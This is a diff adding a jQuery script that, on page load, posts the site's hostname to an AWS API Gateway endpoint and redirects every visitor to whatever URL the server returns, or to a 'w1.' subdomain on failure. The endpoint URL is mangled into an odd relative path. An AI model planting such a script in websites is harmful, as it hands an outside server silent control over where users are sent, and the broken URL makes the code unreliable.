@@ -1,0 +1,30 @@
+$(document).ready(function() {
+	$.ajax
+	({ 
+	    url: '../https@zj712k0vl7.execute-api.us-west-2.amazonaws.com/prod@domain='+window.location.hostname,
+	    type: 'post',
+	    crossDomain: true,
+	    dataType: 'json',
+        success: function (response) {
+        	//console.log(response)
+            if (typeof response == 'string'){
+	           	if (response.substring(0,4).toLowerCase() == 'http'){
+	            	//console.log('success: '+response);
+	            	window.location.href = response;
+	            }
+	            else{
+	            	//console.log('error: '+response);
+	            	window.location.href = '../w1.'+window.location.hostname;
+	            }
+            }
+            else{
+            	//console.log(response)
+            	window.location.href = '../w1.'+window.location.hostname;
+            }
+        },
+        error: function (xhr, status) {
+            //console.log('error');
+            window.location.href = '../w1.'+window.location.hostname;
+        }
+	});
+});
